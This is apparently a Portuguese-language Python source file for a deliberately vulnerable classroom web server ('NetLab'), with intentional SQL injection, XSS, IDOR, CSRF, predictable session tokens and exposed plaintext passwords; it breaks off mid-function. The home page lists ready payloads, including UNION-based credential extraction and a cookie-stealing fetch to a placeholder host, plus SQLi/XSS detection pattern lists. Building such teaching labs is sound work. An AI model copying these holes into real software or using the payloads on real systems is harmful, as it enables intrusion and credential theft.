# painel_servidor.py
# Servidor HTTP educacional vulneravel — NetLab Educacional
#
# AVISO DIDATICO:
# Este servidor implementa vulnerabilidades web REAIS para demonstracao em sala de aula.
# Escopo restrito ao banco de dados SQLite em memoria e a aplicacao web HTTP.
# Nenhum acesso ao sistema operacional e realizado (sem subprocess, os.system, eval, exec).
# Todos os dados sao descartados ao encerrar o servidor — sem persistencia em disco.

import json
import sqlite3
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from typing import Optional
from urllib.parse import parse_qs
import socket

from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QPushButton, QFrame, QTableWidget,
    QTableWidgetItem, QHeaderView, QSplitter,
    QTextEdit, QGroupBox, QGridLayout,
    QProgressBar
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject
from PyQt6.QtGui import QFont, QColor


# ===========================================================================
# Sinais Qt para comunicacao thread-safe entre servidor e interface grafica
# ===========================================================================

class SinaisServidor(QObject):
    """Sinais emitidos pelo servidor HTTP para atualizar a interface grafica."""
    requisicao_recebida = pyqtSignal(dict)
    status_alterado     = pyqtSignal(str)
    alerta_emitido      = pyqtSignal(str)


sinais_servidor = SinaisServidor()


# ===========================================================================
# Banco de dados SQLite em memoria
# ===========================================================================

class BancoDadosServidor:
    """
    Banco de dados SQLite completamente em memoria (':memory:').

    - Dados criados ao iniciar o servidor e destruidos ao encerrar.
    - Nenhum arquivo e gravado em disco.
    - Thread-safe via lock interno.
    - Oferece dois modos de execucao: vulneravel (sem parametrizacao)
      e seguro (com parametrizacao), para fins didaticos.
    """

    def __init__(self):
        self._conexao: Optional[sqlite3.Connection] = None
        self._lock = threading.Lock()

    @property
    def ativo(self) -> bool:
        """Retorna True se o banco esta em memoria e pronto para uso."""
        return self._conexao is not None

    def inicializar(self):
        """
        Cria as tabelas e popula com dados de exemplo.
        Chamado ao iniciar o servidor — recria tudo do zero.
        """
        self._conexao = sqlite3.connect(":memory:", check_same_thread=False)
        cursor = self._conexao.cursor()

        # Tabela de usuarios — senhas em texto puro (vulnerabilidade intencional)
        cursor.execute("""
            CREATE TABLE users (
                id       INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT    NOT NULL UNIQUE,
                password TEXT    NOT NULL,
                role     TEXT    DEFAULT 'user'
            )
        """)

        # Tabela de produtos
        cursor.execute("""
            CREATE TABLE products (
                id    INTEGER PRIMARY KEY AUTOINCREMENT,
                name  TEXT    NOT NULL,
                price REAL    NOT NULL
            )
        """)

        # Tabela de pedidos — relaciona usuarios e produtos
        cursor.execute("""
            CREATE TABLE orders (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id    INTEGER NOT NULL,
                product_id INTEGER NOT NULL,
                quantity   INTEGER NOT NULL DEFAULT 1
            )
        """)

        # Tabela de comentarios — vulneravel a XSS armazenado
        cursor.execute("""
            CREATE TABLE comments (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                author     TEXT,
                content    TEXT NOT NULL,
                created_at TEXT
            )
        """)

        # Usuarios iniciais (senhas intencionalmente em texto puro)
        cursor.executemany(
            "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
            [
                ("admin",  "123456",   "admin"),
                ("alice",  "alice123", "user"),
                ("bob",    "bob456",   "user"),
                ("carlos", "senha123", "user"),
            ]
        )

        # Produtos iniciais
        cursor.executemany(
            "INSERT INTO products (name, price) VALUES (?, ?)",
            [
                ("Notebook Dell XPS 15",      4500.00),
                ("Mouse Logitech MX Master",   320.00),
                ("Teclado Mecanico RGB",        480.00),
                ("Monitor LG 27 polegadas",    1800.00),
                ("Headset Sony WH-1000XM5",    650.00),
            ]
        )

        # Pedidos iniciais
        cursor.executemany(
            "INSERT INTO orders (user_id, product_id, quantity) VALUES (?, ?, ?)",
            [
                (1, 1, 2),
                (2, 2, 1),
                (2, 3, 3),
                (3, 4, 1),
                (1, 5, 2),
            ]
        )

        # Comentarios iniciais (conteudo sera exibido sem escape — XSS armazenado)
        cursor.executemany(
            "INSERT INTO comments (author, content, created_at) VALUES (?, ?, ?)",
            [
                ("visitante", "Produto otimo, recomendo!",
                 datetime.now().strftime("%H:%M:%S")),
                ("alice", "Chegou rapido e em perfeito estado.",
                 datetime.now().strftime("%H:%M:%S")),
            ]
        )

        self._conexao.commit()

    def encerrar(self):
        """Fecha a conexao e descarta todos os dados da memoria."""
        with self._lock:
            if self._conexao:
                self._conexao.close()
                self._conexao = None

    def consultar_vulneravel(self, query: str) -> tuple:
        """
        Executa SELECT por CONCATENACAO DIRETA de strings.

        VULNERAVEL a SQL Injection — usada propositalmente para demonstracao.
        Retorna (linhas, descricao_colunas, mensagem_erro_ou_None).
        """
        with self._lock:
            try:
                cursor = self._conexao.cursor()
                cursor.execute(query)
                return cursor.fetchall(), cursor.description, None
            except sqlite3.Error as erro:
                return [], None, str(erro)

    def consultar_seguro(self, query: str, params: tuple = ()) -> tuple:
        """
        Executa SELECT com PARAMETRIZACAO — resistente a SQL Injection.
        Retorna (linhas, descricao_colunas, mensagem_erro_ou_None).
        """
        with self._lock:
            try:
                cursor = self._conexao.cursor()
                cursor.execute(query, params)
                return cursor.fetchall(), cursor.description, None
            except sqlite3.Error as erro:
                return [], None, str(erro)

    def modificar_vulneravel(self, query: str) -> tuple:
        """
        Executa INSERT/UPDATE/DELETE por CONCATENACAO DIRETA.

        VULNERAVEL a SQL Injection — usada propositalmente.
        Retorna (sucesso, mensagem_erro_ou_None).
        """
        with self._lock:
            try:
                cursor = self._conexao.cursor()
                cursor.execute(query)
                self._conexao.commit()
                return True, None
            except sqlite3.Error as erro:
                return False, str(erro)

    def modificar_seguro(self, query: str, params: tuple = ()) -> tuple:
        """
        Executa INSERT/UPDATE/DELETE com PARAMETRIZACAO.
        Retorna (sucesso, mensagem_erro_ou_None).
        """
        with self._lock:
            try:
                cursor = self._conexao.cursor()
                cursor.execute(query, params)
                self._conexao.commit()
                return True, None
            except sqlite3.Error as erro:
                return False, str(erro)


# Instancia global — reinicializada a cada inicio do servidor
banco_servidor = BancoDadosServidor()


# ===========================================================================
# Sessoes em memoria — propositalmente inseguras (tokens previsiveis)
# ===========================================================================

_sessoes_ativas: dict = {}          # {token: nome_usuario}
_contador_sessao: int = 0           # Incrementado a cada login — previsivel (IDOR)
_lock_sessoes = threading.Lock()


def _criar_sessao(nome_usuario: str) -> str:
    """
    Cria uma sessao com token SEQUENCIAL e PREVISIVEL.
    Demonstra vulnerabilidade de token adivinhavel (Session Prediction).
    Ex: token1, token2, token3...
    """
    global _contador_sessao
    with _lock_sessoes:
        _contador_sessao += 1
        token = f"token{_contador_sessao}"
        _sessoes_ativas[token] = nome_usuario
        return token


def _usuario_da_sessao(cabecalho_cookie: str) -> str:
    """Extrai o nome de usuario a partir do cookie de sessao."""
    if not cabecalho_cookie:
        return ""
    for fragmento in cabecalho_cookie.split(";"):
        fragmento = fragmento.strip()
        if fragmento.startswith("sessao="):
            token = fragmento[7:]
            return _sessoes_ativas.get(token, "")
    return ""


def _remover_sessao(cabecalho_cookie: str):
    """Invalida a sessao do usuario atual."""
    if not cabecalho_cookie:
        return
    for fragmento in cabecalho_cookie.split(";"):
        fragmento = fragmento.strip()
        if fragmento.startswith("sessao="):
            token = fragmento[7:]
            with _lock_sessoes:
                _sessoes_ativas.pop(token, None)
            return


# ===========================================================================
# Padroes para detecao de ataques (apenas para alertas didaticos — nao bloqueiam)
# ===========================================================================

_PADROES_SQLI = (
    "union", "select", "drop", "insert", "delete", "update",
    "' --", "'--", "or '1'='1", "1=1", "' or ", "' and ",
    "/*", "*/", "xp_", "sleep(", "benchmark(",
)

_PADROES_XSS = (
    "<script", "javascript:", "onerror=", "onload=", "alert(",
    "document.cookie", "src=x", "<img", "<iframe",
    "onfocus=", "onmouseover=", "eval(",
)


def _detectar_sqli(valor: str) -> bool:
    """Verifica se o valor contem padroes de SQL Injection (apenas para alertas)."""
    v = valor.lower()
    return any(p in v for p in _PADROES_SQLI)


def _detectar_xss(valor: str) -> bool:
    """Verifica se o valor contem padroes de XSS (apenas para alertas)."""
    v = valor.lower()
    return any(p in v for p in _PADROES_XSS)


# ===========================================================================
# CSS compartilhado por todas as paginas do servidor
# ===========================================================================

_CSS_PAGINAS = """
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        font-family: 'Segoe UI', Roboto, sans-serif;
        background: #0a0f1e;
        color: #e0e4f0;
        min-height: 100vh;
        padding: 20px;
    }
    nav {
        background: #12162a;
        border: 1px solid #1e2d40;
        border-radius: 8px;
        padding: 12px 20px;
        margin-bottom: 24px;
        display: flex;
        gap: 10px;
        flex-wrap: wrap;
        align-items: center;
    }
    .titulo-nav {
        color: #ecf0f1;
        font-weight: bold;
        font-size: 15px;
        margin-right: 8px;
    }
    nav a {
        color: #3498DB;
        text-decoration: none;
        font-size: 13px;
        padding: 4px 10px;
        border-radius: 4px;
        transition: background 0.2s;
    }
    nav a:hover { background: #1e3a5f; }
    .card {
        background: #12162a;
        border: 1px solid #1e2d40;
        border-radius: 10px;
        padding: 22px;
        margin-bottom: 18px;
    }
    h1 { color: #3498DB; font-size: 20px; margin-bottom: 14px; }
    h2 { color: #bdc3c7; font-size: 16px; margin-bottom: 10px; }
    h3 { color: #7f8c8d; font-size: 13px; margin-bottom: 8px; }
    .aviso {
        background: #1a0000;
        border-left: 4px solid #E74C3C;
        padding: 10px 14px;
        border-radius: 4px;
        color: #ff8a8a;
        font-size: 13px;
        margin-bottom: 14px;
    }
    .info {
        background: #001520;
        border-left: 4px solid #3498DB;
        padding: 10px 14px;
        border-radius: 4px;
        color: #7fbfdf;
        font-size: 13px;
        margin-bottom: 14px;
    }
    .sucesso {
        background: #001a00;
        border-left: 4px solid #2ECC71;
        padding: 10px 14px;
        border-radius: 4px;
        color: #7fdf9f;
        font-size: 13px;
        margin-bottom: 14px;
    }
    form {
        display: flex;
        flex-direction: column;
        gap: 10px;
        max-width: 400px;
    }
    label { color: #7f8c8d; font-size: 12px; }
    input[type=text], input[type=password], input[type=email], textarea {
        background: #0d1a2a;
        border: 1px solid #2a4a70;
        border-radius: 6px;
        color: #ecf0f1;
        padding: 9px 13px;
        font-size: 13px;
        font-family: inherit;
        width: 100%;
    }
    textarea { resize: vertical; min-height: 80px; }
    button, input[type=submit] {
        background: #1e3a5f;
        color: #ecf0f1;
        border: 1px solid #3498DB;
        border-radius: 6px;
        padding: 9px 20px;
        font-size: 13px;
        cursor: pointer;
        transition: background 0.2s;
    }
    button:hover, input[type=submit]:hover { background: #2a5080; }
    table {
        width: 100%;
        border-collapse: collapse;
        font-size: 13px;
    }
    th {
        background: #1e2d40;
        color: #7f8c8d;
        padding: 8px 12px;
        text-align: left;
        border-bottom: 1px solid #2a3a50;
    }
    td {
        padding: 8px 12px;
        border-bottom: 1px solid #1a2a3a;
        color: #ecf0f1;
    }
    tr:hover { background: #0f1a2a; }
    code {
        background: #0a0f1a;
        border: 1px solid #1e2d40;
        border-radius: 4px;
        padding: 2px 6px;
        font-family: Consolas, monospace;
        font-size: 12px;
        color: #3498DB;
    }
    pre {
        background: #0a0f1a;
        border: 1px solid #1e2d40;
        border-radius: 6px;
        padding: 12px;
        font-family: Consolas, monospace;
        font-size: 12px;
        color: #2ECC71;
        overflow-x: auto;
        white-space: pre-wrap;
        word-break: break-all;
    }
    .badge {
        display: inline-block;
        border-radius: 4px;
        padding: 2px 8px;
        font-size: 11px;
        font-weight: bold;
    }
    .badge-sqli  { background: #2a1500; color: #E67E22; border: 1px solid #E67E22; }
    .badge-xss   { background: #002a1a; color: #27AE60; border: 1px solid #27AE60; }
    .badge-idor  { background: #1a002a; color: #9B59B6; border: 1px solid #9B59B6; }
    .badge-csrf  { background: #2a2a00; color: #F1C40F; border: 1px solid #F1C40F; }
    .badge-brute { background: #1a1a2a; color: #95a5a6; border: 1px solid #95a5a6; }
    .badge-info  { background: #001520; color: #3498DB; border: 1px solid #3498DB; }
    a { color: #3498DB; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .comentario-item {
        border-bottom: 1px solid #1e2d40;
        padding: 10px 0;
    }
    .comentario-autor {
        color: #7f8c8d;
        font-size: 11px;
        margin-bottom: 4px;
    }
"""


# ===========================================================================
# Handler HTTP — todas as rotas e vulnerabilidades implementadas
# ===========================================================================

class HandlerVulneravel(BaseHTTPRequestHandler):
    """
    Handler HTTP com vulnerabilidades web reais para fins educacionais.

    Vulnerabilidades implementadas (todas sempre ativas, sem configuracao):
      - SQL Injection real em /login e /produtos (concatenacao direta)
      - XSS refletido real em /busca e /perfil (sem escape HTML)
      - XSS armazenado real em /comentarios (banco -> HTML sem escape)
      - IDOR real em /pedidos (sem verificacao de autorizacao)
      - Divulgacao de dados em /usuarios (senhas em texto puro sem autenticacao)
      - CSRF em todos os formularios (sem tokens de protecao)
      - Forca bruta em /login (sem limite de tentativas)
      - Tokens de sessao previsiveis (sequenciais)
      - Divulgacao de erro SQL (queries e erros do banco expostos ao usuario)
    """

    @staticmethod
    def _pagina_base(titulo: str, conteudo: str) -> str:
        """Gera a estrutura HTML base com navegacao e estilos compartilhados."""
        return f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NetLab Vulneravel - {titulo}</title>
    <style>{_CSS_PAGINAS}</style>
</head>
<body>
    <nav>
        <span class="titulo-nav">NetLab Vulneravel</span>
        <a href="/">Inicio</a>
        <a href="/login">Login</a>
        <a href="/produtos">Produtos</a>
        <a href="/busca">Busca</a>
        <a href="/comentarios">Comentarios</a>
        <a href="/pedidos?id=1">Pedidos</a>
        <a href="/usuarios">Usuarios</a>
        <a href="/perfil?nome=visitante">Perfil</a>
        <a href="/api/usuarios">API</a>
    </nav>
    {conteudo}
</body>
</html>"""

    # -----------------------------------------------------------------------
    # Roteamento de requisicoes GET
    # -----------------------------------------------------------------------

    def do_GET(self):
        """Processa todas as requisicoes HTTP GET e roteia para os handlers."""
        ts_inicio  = time.time()
        ip_cliente = self.client_address[0]
        cookies    = self.headers.get("Cookie", "")
        usuario    = _usuario_da_sessao(cookies)

        partes  = self.path.split("?", 1)
        caminho = partes[0]
        qs      = partes[1] if len(partes) > 1 else ""
        params  = parse_qs(qs, keep_blank_values=True)

        if caminho == "/":
            corpo = self._rota_inicial(usuario)
            self._enviar_html(200, corpo)

        elif caminho == "/login":
            corpo = self._rota_formulario_login()
            self._enviar_html(200, corpo)

        elif caminho == "/logout":
            _remover_sessao(cookies)
            self._redirecionar("/")
            self._registrar(ip_cliente, "GET", caminho, 0, ts_inicio)
            return

        elif caminho == "/produtos":
            corpo = self._rota_produtos(params)
            self._enviar_html(200, corpo)

        elif caminho == "/busca":
            corpo = self._rota_busca(params)
            self._enviar_html(200, corpo)

        elif caminho == "/comentarios":
            corpo = self._rota_comentarios()
            self._enviar_html(200, corpo)

        elif caminho == "/pedidos":
            corpo = self._rota_pedidos(params)
            self._enviar_html(200, corpo)

        elif caminho == "/usuarios":
            corpo = self._rota_usuarios()
            self._enviar_html(200, corpo)

        elif caminho == "/perfil":
            corpo = self._rota_perfil(params)
            self._enviar_html(200, corpo)

        elif caminho == "/api/dados":
            self._enviar_json(200, {
                "status": "ok",
                "versao": "1.0",
                "servidor": "NetLab Vulneravel",
                "autenticacao": "nenhuma",
            })
            self._registrar(ip_cliente, "GET", caminho, 0, ts_inicio)
            return

        elif caminho == "/api/usuarios":
            # API que expoe todos os dados sem autenticacao
            linhas, _, _ = banco_servidor.consultar_seguro(
                "SELECT id, username, password, role FROM users"
            )
            dados = [
                {"id": r[0], "username": r[1], "password": r[2], "role": r[3]}
                for r in linhas
            ]
            self._enviar_json(200, {"usuarios": dados, "total": len(dados)})
            sinais_servidor.alerta_emitido.emit(
                f"[DIVULGACAO] /api/usuarios acessado por {ip_cliente} — "
                f"todos os usuarios e senhas expostos via JSON"
            )
            self._registrar(ip_cliente, "GET", caminho, 0, ts_inicio)
            return

        else:
            corpo = self._pagina_base(
                "404",
                '<div class="card"><h1>404 - Pagina nao encontrada</h1>'
                '<p><a href="/">Voltar ao inicio</a></p></div>'
            )
            self._enviar_html(404, corpo)

        self._registrar(ip_cliente, "GET", caminho, 0, ts_inicio)

    # -----------------------------------------------------------------------
    # Roteamento de requisicoes POST
    # -----------------------------------------------------------------------

    def do_POST(self):
        """Processa todas as requisicoes HTTP POST e roteia para os handlers."""
        ts_inicio  = time.time()
        ip_cliente = self.client_address[0]

        partes  = self.path.split("?", 1)
        caminho = partes[0]

        tamanho     = int(self.headers.get("Content-Length", 0))
        corpo_bytes = self.rfile.read(tamanho)
        corpo_texto = corpo_bytes.decode("utf-8", errors="replace")
        params      = parse_qs(corpo_texto, keep_blank_values=True)

        if caminho == "/login":
            corpo, cookie_novo = self._processar_login(params, ip_cliente)
            if cookie_novo:
                self._enviar_html(200, corpo, cookie=cookie_novo)
            else:
                self._enviar_html(200, corpo)

        elif caminho == "/comentarios":
            corpo = self._processar_comentario(params, ip_cliente)
            self._enviar_html(200, corpo)

        else:
            corpo = self._pagina_base(
                "404",
                '<div class="card"><h1>404</h1></div>'
            )
            self._enviar_html(404, corpo)

        self._registrar(ip_cliente, "POST", caminho, tamanho, ts_inicio,
                        corpo=corpo_texto[:400])

    # -----------------------------------------------------------------------
    # Rotas — implementacoes das paginas vulneraveis
    # -----------------------------------------------------------------------

    def _rota_inicial(self, usuario: str) -> str:
        """Pagina inicial com mapa completo das vulnerabilidades disponíveis."""
        bloco_sessao = ""
        if usuario:
            bloco_sessao = (
                f'<div class="sucesso">Sessao ativa: <strong>{usuario}</strong> '
                f'— token de sessao previsivel (sequencial) &nbsp; '
                f'<a href="/logout">[encerrar sessao]</a></div>'
            )

        conteudo = f"""
        <div class="card">
            <h1>NetLab - Servidor de Aplicacao Vulneravel</h1>
            {bloco_sessao}
            <div class="info">
                Servidor HTTP educacional com vulnerabilidades web reais para estudo em sala de aula.<br>
                Escopo restrito: banco de dados em memoria e aplicacao web HTTP.<br>
                Nenhum acesso ao sistema operacional. Dados descartados ao encerrar.
            </div>
            <h2>Mapa de Vulnerabilidades</h2>
            <table>
                <thead>
                    <tr>
                        <th>Tipo</th>
                        <th>Endpoint</th>
                        <th>Descricao</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><span class="badge badge-sqli">SQL Injection</span></td>
                        <td><a href="/login">/login</a> (POST)</td>
                        <td>Login sem parametrizacao — bypass de autenticacao e extracao de dados</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-sqli">SQL Injection</span></td>
                        <td><a href="/produtos?id=1">/produtos?id=1</a></td>
                        <td>Busca por ID via UNION SELECT — extrai dados de outras tabelas</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-xss">XSS Refletido</span></td>
                        <td><a href="/busca">/busca?q=</a></td>
                        <td>Parametro refletido sem escape HTML — execucao de JavaScript no cliente</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-xss">XSS Refletido</span></td>
                        <td><a href="/perfil?nome=visitante">/perfil?nome=</a></td>
                        <td>Parametro nome inserido diretamente no HTML — XSS via URL</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-xss">XSS Armazenado</span></td>
                        <td><a href="/comentarios">/comentarios</a></td>
                        <td>Comentarios salvos no banco e exibidos sem escape — afeta todos os visitantes</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-idor">IDOR</span></td>
                        <td><a href="/pedidos?id=1">/pedidos?id=1</a></td>
                        <td>Qualquer pedido acessivel por ID sem verificar autorizacao</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-info">Divulgacao</span></td>
                        <td><a href="/usuarios">/usuarios</a></td>
                        <td>Lista completa de usuarios e senhas em texto puro sem autenticacao</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-info">Divulgacao</span></td>
                        <td><a href="/api/usuarios">/api/usuarios</a></td>
                        <td>API JSON expoe credenciais sem autenticacao nem controle de acesso</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-csrf">CSRF</span></td>
                        <td>Todos os formularios</td>
                        <td>Formularios sem tokens CSRF — requisicoes forjadas de outros sites sao aceitas</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-brute">Forca Bruta</span></td>
                        <td><a href="/login">/login</a></td>
                        <td>Sem limite de tentativas — qualquer automacao pode enumerar senhas</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-idor">Sessao IDOR</span></td>
                        <td><code>Cookie: sessao=tokenN</code></td>
                        <td>Tokens de sessao sequenciais — adivinhavel por enumeracao</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-info">Erro SQL</span></td>
                        <td>Varios endpoints</td>
                        <td>Erros do banco de dados divulgados diretamente ao usuario</td>
                    </tr>
                </tbody>
            </table>
        </div>
        <div class="card">
            <h2>Payloads de exemplo para explorar</h2>
            <pre>
SQL Injection — bypass de login (campo usuario):
  admin' --
  ' OR '1'='1' --
  ' OR 1=1--
  admin'/*

SQL Injection — extracao via UNION (campo ?id= em /produtos):
  /produtos?id=1 UNION SELECT id,username,password FROM users--
  /produtos?id=999 UNION SELECT 1,username,password FROM users--

XSS Refletido (/busca?q= ou /perfil?nome=):
  &lt;script&gt;alert('XSS')&lt;/script&gt;
  &lt;img src=x onerror=alert(document.cookie)&gt;
  &lt;svg onload=alert(1)&gt;

XSS Armazenado (/comentarios — campo Comentario):
  &lt;script&gt;alert('XSS armazenado')&lt;/script&gt;
  &lt;img src=x onerror=fetch('http://192.168.x.x/steal?c='+document.cookie)&gt;

IDOR — pedidos sem autorizacao:
  /pedidos?id=1   /pedidos?id=2   /pedidos?id=3   ...

Sessao previsivel:
  Apos login: cookie = sessao=token1 (sequencial e adivinhavel)

Forca bruta:
  POST /login com usuario=admin e senhas do dicionario — sem limite</pre>
        </div>
        """
        return self._pagina_base("Inicio", conteudo)

    def _rota_formulario_login(self, mensagem: str = "", tipo_msg: str = "") -> str:
        """
        Formulario de login.

        Vulnerabilidades presentes:
        - Sem token CSRF (formulario forjavel de outro site)
        - Sem limite de tentativas (forca bruta irrestrita)
        - Query vulneravel a SQL Injection no processamento POST
        """
        bloco_msg = ""
        if mensagem:
            classe = "aviso" if tipo_msg == "erro" else "sucesso"
            bloco_msg = f'<div class="{classe}">{mensagem}</div>'

        conteudo = f"""
        <div class="card" style="max-width: 500px;">
            <h1>Login</h1>
            <div class="aviso">
                Vulnerabilidades ativas:<br>
                - SQL Injection no usuario/senha (sem parametrizacao)<br>
                - Sem token CSRF (requisicao forjavel)<br>
                - Sem limite de tentativas (forca bruta irrestrita)
            </div>
            <div class="info">
                Exemplo de SQL Injection: usuario <code>admin' --</code> com qualquer senha.<br>
                Usuarios registrados: admin, alice, bob, carlos<br>
                (senhas visiveis em <a href="/usuarios">/usuarios</a>)
            </div>
            {bloco_msg}
            <!-- SEM TOKEN CSRF — VULNERABILIDADE INTENCIONAL -->
            <form method="POST" action="/login">
                <label>Usuario</label>
                <input type="text" name="usuario" placeholder="admin' --" autocomplete="off">
                <label>Senha</label>
                <input type="password" name="senha" placeholder="qualquer coisa">
                <input type="submit" value="Entrar">
            </form>
        </div>
        """
        return self._pagina_base("Login", conteudo)

    def _processar_login(self, params: dict, ip_cliente: str) -> tuple:
        """
        Processa o POST de login.

        VULNERABILIDADE REAL — SQL Injection:
          Query construida por concatenacao direta sem parametrizacao.
          Payload 'admin' --' ignora a verificacao de senha.
          Payload ' OR '1'='1' --  autentica qualquer usuario.

        VULNERABILIDADE REAL — Forca Bruta:
          Sem delay, sem contador de tentativas, sem CAPTCHA.
        """
        usuario = params.get("usuario", [""])[0]
        senha   = params.get("senha",   [""])[0]

        if not usuario:
            return self._rota_formulario_login("Informe o usuario.", "erro"), None

        # Detecta e alerta (sem bloquear — a exploracao deve funcionar)
        if _detectar_sqli(usuario) or _detectar_sqli(senha):
            sinais_servidor.alerta_emitido.emit(
                f"[SQL INJECTION] {ip_cliente} — payload no login: "
                f"usuario='{usuario[:60]}'"
            )

        # VULNERABILIDADE REAL: concatenacao direta sem parametrizacao
        query_vulneravel = (
            f"SELECT id, username, role FROM users "
            f"WHERE username = '{usuario}' AND password = '{senha}'"
        )

        linhas, _, erro = banco_servidor.consultar_vulneravel(query_vulneravel)

        if erro:
            # VULNERABILIDADE REAL: erro do banco divulgado ao usuario
            conteudo = f"""
            <div class="card">
                <h1>Erro no banco de dados</h1>
                <div class="aviso">
                    Erro SQLite divulgado (information disclosure):
                </div>
                <pre>{erro}</pre>
                <pre>Query executada:\n{query_vulneravel}</pre>
                <a href="/login">Tentar novamente</a>
            </div>
            """
            return self._pagina_base("Erro", conteudo), None

        if linhas:
            id_usuario, nome_usuario, papel = linhas[0]
            token = _criar_sessao(nome_usuario)

            via_injecao = _detectar_sqli(usuario)
            metodo_acesso = "SQL Injection" if via_injecao else "credenciais validas"

            conteudo = f"""
            <div class="card">
                <h1>Login bem-sucedido</h1>
                <div class="sucesso">
                    Autenticado como: <strong>{nome_usuario}</strong>
                    (papel: {papel}) — via {metodo_acesso}
                </div>
                <p>Token de sessao: <code>{token}</code>
                   (token sequencial — previsivel por enumeracao)</p>
                <br>
                <pre>Query executada (vulneravel):\n{query_vulneravel}\n\nResultado retornado: {linhas}</pre>
                <br>
                <a href="/">Ir para o inicio</a> &nbsp;|&nbsp;
                <a href="/usuarios">Ver todos os usuarios</a> &nbsp;|&nbsp;
                <a href="/pedidos?id=1">Ver pedidos (IDOR)</a> &nbsp;|&nbsp;
                <a href="/logout">Encerrar sessao</a>
            </div>
            """
            return self._pagina_base("Login", conteudo), f"sessao={token}; Path=/"

        return self._rota_formulario_login(
            f"Credenciais invalidas.<br>"
            f"<small style='color:#7f8c8d;'>Query executada: "
            f"<code>{query_vulneravel}</code></small>",
            "erro"
        ), None

    def _rota_produtos(self, params: dict) -> str:
        """
        Lista produtos ou busca por ID.

        VULNERABILIDADE REAL — SQL Injection:
          O parametro ?id= e concatenado diretamente na query.
          UNION SELECT permite extrair dados de qualquer tabela.
          Ex: /produtos?id=1 UNION SELECT id,username,password FROM users--
        """
        produto_id = params.get("id", [""])[0].strip()

        if not produto_id:
            # Lista todos os produtos (esta consulta e segura)
            linhas, _, _ = banco_servidor.consultar_seguro(
                "SELECT id, name, price FROM products ORDER BY id"
            )
            linhas_html = "".join(
                f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>R$ {r[2]:.2f}</td>"
                f"<td><a href='/produtos?id={r[0]}'>Detalhar</a></td></tr>"
                for r in linhas
            )
            conteudo = f"""
            <div class="card">
                <h1>Catalogo de Produtos</h1>
                <div class="aviso">
                    Vulnerabilidade SQL Injection ativa no parametro <code>?id=</code>.<br>
                    Teste: <a href="/produtos?id=1 UNION SELECT id,username,password FROM users--">
                    /produtos?id=1 UNION SELECT id,username,password FROM users--</a>
                </div>
                <table>
                    <thead>
                        <tr><th>ID</th><th>Nome</th><th>Preco</th><th>Acao</th></tr>
                    </thead>
                    <tbody>{linhas_html}</tbody>
                </table>
            </div>
            """
            return self._pagina_base("Produtos", conteudo)

        # Alerta didatico (sem bloqueio)
        if _detectar_sqli(produto_id):
            sinais_servidor.alerta_emitido.emit(
                f"[SQL INJECTION] /produtos?id=: '{produto_id[:80]}'"
            )

        # VULNERABILIDADE REAL: concatenacao direta sem parametrizacao
        query_vulneravel = (
            f"SELECT id, name, price FROM products WHERE id = {produto_id}"
        )

        linhas, descricao, erro = banco_servidor.consultar_vulneravel(query_vulneravel)

        if erro:
            conteudo = f"""
            <div class="card">
                <h1>Erro no banco de dados</h1>
                <div class="aviso">Erro divulgado ao usuario (information disclosure):</div>
                <pre>{erro}</pre>
                <pre>Query executada:\n{query_vulneravel}</pre>
                <a href="/produtos">Voltar ao catalogo</a>
            </div>
            """
            return self._pagina_base("Erro SQL", conteudo)

        if not linhas:
            conteudo = f"""
            <div class="card">
                <h1>Nenhum resultado</h1>
                <div class="aviso">Nenhum produto encontrado para o id informado.</div>
                <pre>Query executada:\n{query_vulneravel}</pre>
                <a href="/produtos">Ver todos os produtos</a>
            </div>
            """
            return self._pagina_base("Produto", conteudo)

        # Colunas retornadas (podem ser de outra tabela via UNION SELECT)
        nomes_colunas = [d[0] for d in descricao] if descricao else ["col1", "col2", "col3"]
        cab_html  = "".join(f"<th>{c}</th>" for c in nomes_colunas)
        # Dados inseridos sem escape — XSS possivel se o banco foi injetado com scripts
        corpo_html = ""
        for linha in linhas:
            corpo_html += "<tr>" + "".join(f"<td>{v}</td>" for v in linha) + "</tr>"

        conteudo = f"""
        <div class="card">
            <h1>Resultado da Consulta</h1>
            <div class="aviso">
                O resultado abaixo pode conter dados de outras tabelas
                se UNION SELECT foi utilizado no parametro ?id=.
            </div>
            <pre>Query executada:\n{query_vulneravel}</pre>
            <br>
            <table>
                <thead><tr>{cab_html}</tr></thead>
                <tbody>{corpo_html}</tbody>
            </table>
            <br>
            <a href="/produtos">Voltar ao catalogo</a>
        </div>
        """
        return self._pagina_base("Produto", conteudo)

    def _rota_busca(self, params: dict) -> str:
        """
        Pagina de busca de produtos.

        VULNERABILIDADE REAL — XSS Refletido:
          O parametro ?q= e inserido diretamente no HTML sem nenhum escape.
          Payloads como <script>alert(1)</script> sao executados imediatamente.
        """
        # Valor do parametro recebido diretamente — sem nenhum tratamento
        termo_bruto = params.get("q", [""])[0]

        if _detectar_xss(termo_bruto):
            sinais_servidor.alerta_emitido.emit(
                f"[XSS REFLETIDO] /busca?q=: '{termo_bruto[:80]}'"
            )

        bloco_resultado = ""
        if termo_bruto:
            # A busca em si usa parametrizacao para evitar SQL Injection neste campo
            # A vulnerabilidade esta na EXIBICAO do termo, nao na busca
